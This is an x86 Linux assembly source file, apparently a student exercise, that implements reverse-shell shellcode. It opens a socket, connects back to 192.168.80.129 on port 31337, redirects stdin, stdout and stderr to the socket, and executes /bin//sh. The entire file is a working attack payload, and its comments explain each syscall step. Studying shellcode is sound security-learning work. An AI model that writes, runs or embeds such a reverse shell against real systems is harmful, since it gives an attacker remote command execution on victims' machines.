BITS 32
; Simple 
;
; Written by skuppers: skuppers@student.42.fr

global _start

section .text
    _start:
	; s = socket(PF_INET(2), SOCK_STREAM(1), 0)	
	; for socket calls eax=0x66, ebx specifies syscall, ecx points to args
	push BYTE 0x66	; socketcall is syscall nb°102 (0x66)
	pop eax		; put in eax
	cdq		; Doubles size => edx is nulled
	xor ebx,ebx	; ebx is type of socketcall
	inc ebx		; nb°1 = SYS_SOCKET = socket()
	push edx	; Push arguments (inverted) { proto = 0,
	push BYTE 0x1	;		     		SOCK_STREAM = 1
	push BYTE 0x2	;		     		AF_INET = 2 }
	mov ecx,esp	; ecx points to args
	int 0x80	; eax holds socket fd
	mov esi,eax	; save it here for later

	; connect(sockfd, [2, 31337, <ip>], 16)
	push BYTE 0x66
	pop eax
	inc ebx			; ebx = 2
	push DWORD 0x8150a8c0	; IP ADDR here	<192.168.80.129>
	push WORD 0x697a	; port 31337
	push WORD bx		; AF_INET = 2
	mov ecx,esp
	push BYTE 16		; 16
	push ecx		; struct
	push esi		; sockfd
	mov ecx,esp
	inc ebx			; 3 = SYS_CONNECT = connect()
	int 0x80		; eax is new connection fd

	; dup2(sockfd, {stdin, out, err })
	xchg eax,ebx		; switch connection_fd and 3
	push BYTE 0x2		; ecx = 2
	pop ecx
      dup_loop:			; for loop
	mov BYTE al, 0x3F	; Syscall nb°63 dup2
	int 0x80		; dup2(connection_fd, ecx(2,1,0))
	dec ecx			; --ecx
	jns dup_loop		; if ecx > 0

	; execve(char *path, char *argv[], char *envp[])
	mov BYTE al, 11		; syscall 11
	xor edx,edx
	push edx		; Push null
	push 0x68732f2f		; //sh
	push 0x6e69622f		; /bin
	mov ebx, esp		; push '/bin//sh'
	push edx
	mov edx, esp		; empty envp
	push ebx		; '/bin//sh' as arg -> convention
	mov ecx,esp		; argv
	int 0x80
